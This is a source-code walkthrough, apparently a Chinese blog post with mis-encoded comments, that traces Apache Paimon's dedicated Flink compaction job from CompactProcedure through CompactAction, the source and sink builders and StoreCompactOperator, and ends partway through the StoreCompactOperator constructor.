h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸“ç”¨å‹ç¼©ä»»åŠ¡çš„å‰ææ˜¯DDLçš„æ—¶å€™é…ç½®äº†<code>write-only=true</code>åï¼Œå•ç‹¬å¼€å¯ä¸€ä¸ªFlinkä»»åŠ¡å»åšå‹ç¼©</p>
<h2 data-id="heading-1">äºŒ.ä¸“ç”¨å‹ç¼©ä»»åŠ¡æµç¨‹</h2>
<h3 data-id="heading-2">1.<code>CompactProcedure.call()</code> -- å…¥å£</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> String[] call(
        ProcedureContext procedureContext,
        String tableId,
        String partitions,
        String orderStrategy,
        String orderByColumns,
        String tableOptions,
        String whereSql,
        String partitionIdleTime,
        String compactStrategy)
        <span class="hljs-keyword">throws</span> Exception {
    Map&lt;String, String&gt; catalogOptions = catalog.options();
    <span class="hljs-comment">// è§£æä¸“ç”¨å‹ç¼©ä»»åŠ¡é…ç½®çš„optionså†…éƒ¨å‚æ•°ï¼Œå½¢æˆmap</span>
    Map&lt;String, String&gt; tableConf =
            StringUtils.isNullOrWhitespaceOnly(tableOptions)
                    ? Collections.emptyMap()
                    : ParameterUtils.parseCommaSeparatedKeyValues(tableOptions); <span class="hljs-comment">// æŒ‰ç…§,åˆ†å‰²</span>
    <span class="hljs-type">Identifier</span> <span class="hljs-variable">identifier</span> <span class="hljs-operator">=</span> Identifier.fromString(tableId);
    CompactAction action;
    String jobName;
    <span class="hljs-comment">// CASE-1: æ²¡é…ç½®order byï¼Œèµ°CompactAction</span>
    <span class="hljs-keyword">if</span> (orderStrategy.isEmpty() &amp;&amp; orderByColumns.isEmpty()) {
        <span class="hljs-comment">// åˆ›å»ºCompactAction</span>
        action =
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompactAction</span>(
                        identifier.getDatabaseName(),
                        identifier.getObjectName(),
                        catalogOptions,
                        tableConf);
        <span class="hljs-comment">// é…ç½®ç›¸å…³å‚æ•°</span>
        <span class="hljs-keyword">if</span> (!(StringUtils.isNullOrWhitespaceOnly(partitionIdleTime))) {
            action.withPartitionIdleTime(TimeUtils.parseDuration(partitionIdleTime));
        }

        <span class="hljs-keyword">if</span> (checkCompactStrategy(compactStrategy)) {
            action.withFullCompaction(compactStrategy.trim().equalsIgnoreCase(FULL));
        }
        jobName = <span class="hljs-string">"Compact Job"</span>;
    }
    <span class="hljs-comment">// CASE-2: é…ç½®äº†order byï¼Œèµ°SortCompactAction</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!orderStrategy.isEmpty() &amp;&amp; !orderByColumns.isEmpty()) {
        Preconditions.checkArgument(
                StringUtils.isNullOrWhitespaceOnly(partitionIdleTime),
                <span class="hljs-string">"sort compact do not support 'partition_idle_time'."</span>);
        action =
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">SortCompactAction</span>(
                                identifier.getDatabaseName(),
                                identifier.getObjectName(),
                                catalogOptions,
                                tableConf)
                        .withOrderStrategy(orderStrategy)
                        .withOrderColumns(orderByColumns.split(<span class="hljs-string">","</span>));
        jobName = <span class="hljs-string">"Sort Compact Job"</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(
                <span class="hljs-string">"You must specify 'order strategy' and 'order by columns' both."</span>);
    }
    <span class="hljs-comment">// è®¾ç½®åˆ†åŒºè¿‡æ»¤</span>
    <span class="hljs-keyword">if</span> (!(StringUtils.isNullOrWhitespaceOnly(partitions))) {
        action.withPartitions(ParameterUtils.getPartitions(partitions.split(<span class="hljs-string">";"</span>)));
    }
    <span class="hljs-comment">// è®¾ç½®whereå‚æ•°</span>
    <span class="hljs-keyword">if</span> (!StringUtils.isNullOrWhitespaceOnly(whereSql)) {
        action.withWhereSql(whereSql);
    }
    <span class="hljs-comment">// æ‰§è¡Œ</span>
    <span class="hljs-keyword">return</span> execute(procedureContext, action, jobName);
}
</code></pre>
<h3 data-id="heading-3">2.<code>CompactActionç±»</code></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompactAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TableActionBase</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">LOGGER</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(CompactAction.class);

    <span class="hljs-keyword">private</span> List&lt;Map&lt;String, String&gt;&gt; partitions;

    <span class="hljs-keyword">private</span> String whereSql;

    <span class="hljs-meta">@Nullable</span> <span class="hljs-keyword">private</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">partitionIdleTime</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">private</span> Boolean fullCompaction;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CompactAction</span><span class="hljs-params">(
            String database,
            String tableName,
            Map&lt;String, String&gt; catalogConfig,
            Map&lt;String, String&gt; tableConf)</span> {
        <span class="hljs-built_in">super</span>(database, tableName, catalogConfig);
        <span class="hljs-keyword">if</span> (!(table <span class="hljs-keyword">instanceof</span> FileStoreTable)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(
                    String.format(
                            <span class="hljs-string">"Only FileStoreTable supports compact action. The table type is '%s'."</span>,
                            table.getClass().getName()));
        }
        <span class="hljs-comment">// å¼ºåˆ¶å¯¹å‹ç¼©ä»»åŠ¡è®¾ç½®write-only = falseï¼Œå› ä¸ºå‹ç¼©ä»»åŠ¡éƒ½è®¾ç½®ä¸ºtrueï¼Œå°±æ²¡äººå‹ç¼©äº†</span>
        HashMap&lt;String, String&gt; dynamicOptions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(tableConf);
        dynamicOptions.put(CoreOptions.WRITE_ONLY.key(), <span class="hljs-string">"false"</span>);
        table = table.copy(dynamicOptions);
    }

    <span class="hljs-comment">// ------------------------------------------------------------------------</span>
    <span class="hljs-comment">//  Java API</span>
    <span class="hljs-comment">// ------------------------------------------------------------------------</span>

    <span class="hljs-keyword">public</span> CompactAction <span class="hljs-title function_">withPartitions</span><span class="hljs-params">(List&lt;Map&lt;String, String&gt;&gt; partitions)</span> {
        <span class="hljs-built_in">this</span>.partitions = partitions;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-keyword">public</span> CompactAction <span class="hljs-title function_">withWhereSql</span><span class="hljs-params">(String whereSql)</span> {
        <span class="hljs-built_in">this</span>.whereSql = whereSql;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-keyword">public</span> CompactAction <span class="hljs-title function_">withPartitionIdleTime</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Duration partitionIdleTime)</span> {
        <span class="hljs-built_in">this</span>.partitionIdleTime = partitionIdleTime;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-keyword">public</span> CompactAction <span class="hljs-title function_">withFullCompaction</span><span class="hljs-params">(Boolean fullCompaction)</span> {
        <span class="hljs-built_in">this</span>.fullCompaction = fullCompaction;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">build</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">conf</span> <span class="hljs-operator">=</span> env.getConfiguration();
        <span class="hljs-comment">// æ˜¯å¦æ˜¯æµæ‰§è¡Œæ¨¡å¼</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isStreaming</span> <span class="hljs-operator">=</span>
                conf.get(ExecutionOptions.RUNTIME_MODE) == RuntimeExecutionMode.STREAMING;
        <span class="hljs-type">FileStoreTable</span> <span class="hljs-variable">fileStoreTable</span> <span class="hljs-operator">=</span> (FileStoreTable) table;
        <span class="hljs-keyword">switch</span> (fileStoreTable.bucketMode()) {
            <span class="hljs-keyword">case</span> BUCKET_UNAWARE: <span class="hljs-comment">// bucket = -1 èµ°è¿™</span>
                {
                    buildForUnawareBucketCompaction(env, fileStoreTable, isStreaming);
                    <span class="hljs-keyword">break</span>;
                }
            <span class="hljs-keyword">case</span> HASH_FIXED:
            <span class="hljs-keyword">case</span> HASH_DYNAMIC:
            <span class="hljs-keyword">default</span>: <span class="hljs-comment">// å…¶ä»–æƒ…å†µï¼Œèµ°è¿™</span>
                {
                    buildForTraditionalCompaction(env, fileStoreTable, isStreaming);
                }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildForTraditionalCompaction</span><span class="hljs-params">(
            StreamExecutionEnvironment env, FileStoreTable table, <span class="hljs-type">boolean</span> isStreaming)</span>
            <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// æ­¥1. ç¡®å®šå‹ç¼©ä»»åŠ¡çš„æ‰§è¡Œæ¨¡å¼ï¼Œæµè¿˜æ˜¯æ‰¹ï¼Œå¹¶é’ˆå¯¹æµå¼ï¼Œå¼ºåˆ¶é‡‡ç”¨å¼‚æ­¥å‹ç¼©å‚æ•°</span>
        <span class="hljs-keyword">if</span> (fullCompaction == <span class="hljs-literal">null</span>) {
            fullCompaction = !isStreaming; <span class="hljs-comment">// æ‰¹é‡å‹ç¼©é»˜è®¤æ˜¯full-compactionï¼Œæµå¼éœ€è¦å•ç‹¬é…ç½®</span>
        } <span class="hljs-keyword">else</span> {
            Preconditions.checkArgument(
                    !(fullCompaction &amp;&amp; isStreaming), <span class="hljs-comment">// æµæ¨¡å¼ï¼Œä¸å…è®¸é…ç½®compactStrategyä¸ºFULLï¼Œé»˜è®¤æ˜¯null</span>
                    <span class="hljs-string">"The full compact strategy is only supported in batch mode. Please add -Dexecution.runtime-mode=BATCH."</span>);
        }
        <span class="hljs-comment">/* å¦‚æœæ˜¯æµå¼å‹ç¼©ï¼Œå¼ºåˆ¶é‡‡ç”¨å¼‚æ­¥å‹ç¼©å‚æ•°
            num-sorted-run.stop-trigger = 2147483647
            sort-spill-threshold = 10
            lookup-wait = false
         */</span>
        <span class="hljs-keyword">if</span> (isStreaming) {
            <span class="hljs-comment">// for completely asynchronous compaction</span>
            HashMap&lt;String, String&gt; dynamicOptions =
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, String&gt;() {
                        {
                            put(CoreOptions.NUM_SORTED_RUNS_STOP_TRIGGER.key(), <span class="hljs-string">"2147483647"</span>);
                            put(CoreOptions.SORT_SPILL_THRESHOLD.key(), <span class="hljs-string">"10"</span>);
                            put(CoreOptions.LOOKUP_WAIT.key(), <span class="hljs-string">"false"</span>);
                        }
                    };
            table = table.copy(dynamicOptions);
        }
        <span class="hljs-comment">// æ­¥2. åˆ›å»ºCompactorSourceBuilderå’ŒCompactorSinkBuilder</span>
        <span class="hljs-type">CompactorSourceBuilder</span> <span class="hljs-variable">sourceBuilder</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompactorSourceBuilder</span>(identifier.getFullName(), table);
        <span class="hljs-type">CompactorSinkBuilder</span> <span class="hljs-variable">sinkBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompactorSinkBuilder</span>(table, fullCompaction);

        sourceBuilder.withPartitionPredicate(getPredicate());
        <span class="hljs-comment">// æ­¥3. æ ¹æ®CompactorSourceBuilderå»åˆ›å»ºDataStreamSourceï¼Œå’ŒCompactorSinkBuilderçš„ä¸Šæ¸¸æµ</span>
        DataStreamSource&lt;RowData&gt; source =
                sourceBuilder
                        .withEnv(env)
                        .withContinuousMode(isStreaming)
                        .withPartitionIdleTime(partitionIdleTime)
                        .build();
        sinkBuilder.withInput(source).build();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">buildForUnawareBucketCompaction</span><span class="hljs-params">(
            StreamExecutionEnvironment env, FileStoreTable table, <span class="hljs-type">boolean</span> isStreaming)</span>
            <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">UnawareBucketCompactionTopoBuilder</span> <span class="hljs-variable">unawareBucketCompactionTopoBuilder</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnawareBucketCompactionTopoBuilder</span>(env, identifier.getFullName(), table);

        unawareBucketCompactionTopoBuilder.withPartitionPredicate(getPredicate());
        unawareBucketCompactionTopoBuilder.withContinuousMode(isStreaming);
        unawareBucketCompactionTopoBuilder.withPartitionIdleTime(partitionIdleTime);
        unawareBucketCompactionTopoBuilder.build();
    }

    <span class="hljs-comment">// æ„å»ºè°“è¯è¿‡æ»¤</span>
    <span class="hljs-keyword">protected</span> Predicate <span class="hljs-title function_">getPredicate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// æ ¡éªŒpartitionså’Œwhereæ˜¯ä¸èƒ½ä¸€èµ·ä½¿ç”¨çš„</span>
        Preconditions.checkArgument(
                partitions == <span class="hljs-literal">null</span> || whereSql == <span class="hljs-literal">null</span>,
                <span class="hljs-string">"partitions and where cannot be used together."</span>);
        <span class="hljs-type">Predicate</span> <span class="hljs-variable">predicate</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-comment">// CASE-1: ä½¿ç”¨partitionsçš„å‚æ•°</span>
        <span class="hljs-keyword">if</span> (partitions != <span class="hljs-literal">null</span>) {
            predicate =
                    PredicateBuilder.or(
                            partitions.stream()
                                    .map(
                                            p -&gt;
                                                    createPartitionPredicate(
                                                            p,
                                                            table.rowType(),
                                                            ((FileStoreTable) table)
                                                                    .coreOptions()
                                                                    .partitionDefaultName()))
                                    .toArray(Predicate[]::<span class="hljs-keyword">new</span>));
        }
        <span class="hljs-comment">// CASE-2: ä½¿ç”¨whereå‚æ•°</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (whereSql != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">SimpleSqlPredicateConvertor</span> <span class="hljs-variable">simpleSqlPredicateConvertor</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleSqlPredicateConvertor</span>(table.rowType());
            predicate = simpleSqlPredicateConvertor.convertSqlToPredicate(whereSql);
        }

        <span class="hljs-comment">// Check whether predicate contain non partition key.</span>
        <span class="hljs-comment">// æ£€æŸ¥è°“è¯æ˜¯å¦åŒ…å«éåˆ†åŒºé”®ã€‚</span>
        <span class="hljs-keyword">if</span> (predicate != <span class="hljs-literal">null</span>) {
            LOGGER.info(<span class="hljs-string">"the partition predicate of compaction is {}"</span>, predicate);
            <span class="hljs-type">PartitionPredicateVisitor</span> <span class="hljs-variable">partitionPredicateVisitor</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">PartitionPredicateVisitor</span>(table.partitionKeys());
            Preconditions.checkArgument(
                    predicate.visit(partitionPredicateVisitor),
                    <span class="hljs-string">"Only partition key can be specialized in compaction action."</span>);
        }

        <span class="hljs-keyword">return</span> predicate;
    }
    <span class="hljs-comment">// è¿è¡Œ</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        build(); <span class="hljs-comment">// è°ƒbuild()æ„å»ºFlink DataStream</span>
        execute(<span class="hljs-string">"Compact job"</span>); <span class="hljs-comment">// æäº¤ Flink Job</span>
    }
}
</code></pre>
<h3 data-id="heading-4">3.<code>CompactorSourceBuilder</code> -- æ„å»ºDataStreamSource</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ„é€ å‡½æ•°</span>
<span class="hljs-keyword">public</span> <span class="hljs-title function_">CompactorSourceBuilder</span><span class="hljs-params">(String tableIdentifier, FileStoreTable table)</span> {
    <span class="hljs-built_in">this</span>.tableIdentifier = tableIdentifier;
    <span class="hljs-built_in">this</span>.table = table;
}

<span class="hljs-comment">// build()</span>
<span class="hljs-keyword">public</span> DataStreamSource&lt;RowData&gt; <span class="hljs-title function_">build</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (env == <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"StreamExecutionEnvironment should not be null."</span>);
    }
    <span class="hljs-comment">// æ­¥éª¤1. æ‰«æå…ƒæ•°æ®ï¼Œç”Ÿæˆéœ€è¦å‹ç¼©çš„(partition, bucket)åˆ—è¡¨</span>
    <span class="hljs-comment">// è¿™é‡Œçš„isContinuousæ˜¯isStreamingèµ‹å€¼çš„</span>
    <span class="hljs-type">CompactBucketsTable</span> <span class="hljs-variable">compactBucketsTable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompactBucketsTable</span>(table, isContinuous);
    <span class="hljs-type">RowType</span> <span class="hljs-variable">produceType</span> <span class="hljs-operator">=</span> compactBucketsTable.rowType();
    
    <span class="hljs-comment">// æ­¥éª¤2. æ„å»ºDataStreamSource</span>
    DataStreamSource&lt;RowData&gt; dataStream =
            env.fromSource(
                    buildSource(compactBucketsTable),
                    WatermarkStrategy.noWatermarks(),
                    tableIdentifier + <span class="hljs-string">"-compact-source"</span>,
                    InternalTypeInfo.of(LogicalTypeConversion.toLogicalType(produceType)));
                    
    <span class="hljs-comment">// æ­¥éª¤3. é‡‡ç”¨åˆ†åŒºè°“è¯è¿‡æ»¤ï¼Œæµå¤„ç†æ¨¡å¼ä¸æ”¯æŒpartitionIdleTime</span>
    <span class="hljs-keyword">if</span> (isContinuous) {
        Preconditions.checkArgument(
                partitionIdleTime == <span class="hljs-literal">null</span>, <span class="hljs-string">"Streaming mode does not support partitionIdleTime"</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (partitionIdleTime != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// æ‰¹å¤„ç†æ¨¡å¼å¯ä»¥è¿‡æ»¤æ‰æœ€è¿‘ä¿®æ”¹çš„åˆ†åŒº</span>
        Map&lt;BinaryRow, Long&gt; partitionInfo = getPartitionInfo(compactBucketsTable);
        <span class="hljs-type">long</span> <span class="hljs-variable">historyMilli</span> <span class="hljs-operator">=</span>
                LocalDateTime.now()
                        .minus(partitionIdleTime)
                        .atZone(ZoneId.systemDefault())
                        .toInstant()
                        .toEpochMilli();
        SingleOutputStreamOperator&lt;RowData&gt; filterStream =
                dataStream.filter(
                        rowData -&gt; {
                            <span class="hljs-type">BinaryRow</span> <span class="hljs-variable">partition</span> <span class="hljs-operator">=</span> deserializeBinaryRow(rowData.getBinary(<span class="hljs-number">1</span>));
                            <span class="hljs-keyword">return</span> partitionInfo.get(partition) &lt;= historyMilli;
                        });
        dataStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataStreamSource</span>&lt;&gt;(filterStream);
    }
    
    <span class="hljs-comment">// æ­¥éª¤4. è®¾ç½®å¹¶è¡Œåº¦</span>
    <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span>
            Options.fromMap(table.options()).get(FlinkConnectorOptions.SCAN_PARALLELISM);
    <span class="hljs-keyword">if</span> (parallelism != <span class="hljs-literal">null</span>) {
        dataStream.setParallelism(parallelism);
    }
    <span class="hljs-keyword">return</span> dataStream;
}
</code></pre>
<h3 data-id="heading-5">4.<code>CompactorSinkBuilder</code> -- æ„å»ºDataStreamSink</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompactorSinkBuilder</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> FileStoreTable table; <span class="hljs-comment">// ç»‘å®šçš„tableè¡¨</span>

    <span class="hljs-keyword">private</span> DataStream&lt;RowData&gt; input; <span class="hljs-comment">// è¾“å…¥æµ</span>

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> fullCompaction; <span class="hljs-comment">// æ˜¯å¦é…ç½®compactStrategyä¸ºfullï¼Œæˆ–è€…é‡‡ç”¨æ‰¹å¤„ç†æ¨¡å¼</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CompactorSinkBuilder</span><span class="hljs-params">(FileStoreTable table, <span class="hljs-type">boolean</span> fullCompaction)</span> {
        <span class="hljs-built_in">this</span>.table = table;
        <span class="hljs-built_in">this</span>.fullCompaction = fullCompaction;
    }

    <span class="hljs-keyword">public</span> CompactorSinkBuilder <span class="hljs-title function_">withInput</span><span class="hljs-params">(DataStream&lt;RowData&gt; input)</span> {
        <span class="hljs-built_in">this</span>.input = input;
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-keyword">public</span> DataStreamSink&lt;?&gt; build() {
        <span class="hljs-comment">// ä¸æ”¯æŒbucket = -1çš„</span>
        <span class="hljs-type">BucketMode</span> <span class="hljs-variable">bucketMode</span> <span class="hljs-operator">=</span> table.bucketMode();
        <span class="hljs-keyword">switch</span> (bucketMode) {
            <span class="hljs-keyword">case</span> HASH_FIXED:
            <span class="hljs-keyword">case</span> HASH_DYNAMIC:
                <span class="hljs-keyword">return</span> buildForBucketAware();
            <span class="hljs-keyword">case</span> BUCKET_UNAWARE:
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">"Unsupported bucket mode: "</span> + bucketMode);
        }
    }

    <span class="hljs-keyword">private</span> DataStreamSink&lt;?&gt; buildForBucketAware() {
        <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span>
                Optional.ofNullable(
                                table.options().get(FlinkConnectorOptions.SINK_PARALLELISM.key()))
                        .map(Integer::valueOf)
                        .orElse(<span class="hljs-literal">null</span>);
        DataStream&lt;RowData&gt; partitioned =
                partition(input, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BucketsRowChannelComputer</span>(), parallelism);
        <span class="hljs-comment">// æ„å»ºCompactorSink</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompactorSink</span>(table, fullCompaction).sinkFrom(partitioned);
    }
}
</code></pre>
<h3 data-id="heading-6">5.<code>CompactorSink</code></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompactorSink</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FlinkSink</span>&lt;RowData&gt; {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> fullCompaction; <span class="hljs-comment">// æ˜¯å¦é…ç½®compactStrategyä¸ºfullï¼Œæˆ–è€…é‡‡ç”¨æ‰¹å¤„ç†æ¨¡å¼</span>

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CompactorSink</span><span class="hljs-params">(FileStoreTable table, <span class="hljs-type">boolean</span> fullCompaction)</span> {
        <span class="hljs-built_in">super</span>(table, <span class="hljs-literal">false</span>);
        <span class="hljs-built_in">this</span>.fullCompaction = fullCompaction;
    }
    <span class="hljs-comment">// åˆ›å»ºå†™å…¥ç®—å­Factoryå¯¹è±¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> OneInputStreamOperatorFactory&lt;RowData, Committable&gt; <span class="hljs-title function_">createWriteOperatorFactory</span><span class="hljs-params">(
            StoreSinkWrite.Provider writeProvider, String commitUser)</span> {
        <span class="hljs-comment">// åˆ›å»º StoreCompactOperator.Factory</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreCompactOperator</span>.Factory(table, writeProvider, commitUser, fullCompaction);
    }
    <span class="hljs-comment">// åˆ›å»ºæäº¤ç®—å­Factoryå¯¹è±¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> Committer.Factory&lt;Committable, ManifestCommittable&gt; <span class="hljs-title function_">createCommitterFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> context -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">StoreCommitter</span>(table, table.newCommit(context.commitUser()), context);
    }
    <span class="hljs-comment">// åˆ›å»ºCommittableStateManager</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> CommittableStateManager&lt;ManifestCommittable&gt; <span class="hljs-title function_">createCommittableStateManager</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoopCommittableStateManager</span>();
    }
}
</code></pre>
<h3 data-id="heading-7">6.StoreCompactOperator</h3>
<h4 data-id="heading-8">(1) æ„é€ å‡½æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">StoreCompactOperator</span><span class="hljs-params">(
        StreamOperatorParameters&lt;Committable&gt; parameters,
        FileStoreTable table,
        StoreSinkWrite.Provider storeSinkWriteProvider,
        String initialCommitUser,
        <span class="hljs-type">boolean</span> fullCompaction)</span> {
    <span class="hljs-built_in">super</span>(parameters, Options.fromMap(table.options()));
    <span class="hljs-comment">// æ£€éªŒwrite-onlyå‚æ•°å¿…é¡»ä¸ºfalseï¼Œå› ä¸ºå‹ç¼©ä»»åŠ¡å¦‚æœéƒ½ä¸ºtrueï¼Œé‚£ä¹ˆå°±æ²¡äººæ‰§è¡Œå‹ç¼©æ“ä½œäº†</span>
    <span class="hljs-comment">// åœ¨ CompactAction æ„é€ å‡½æ•°ä¸­å·²ç»å¼ºåˆ¶è®¾ç½® write-only=false</span>
    Preconditions.checkArgument(
            !table.coreOptions().writeOnly(),
            CoreOptions.WRITE_ONLY.key() + <span class="hljs-string">" should not be true for StoreCompactOperator."</span>);
    <span class="hljs-built_in">this</span>.table = table;
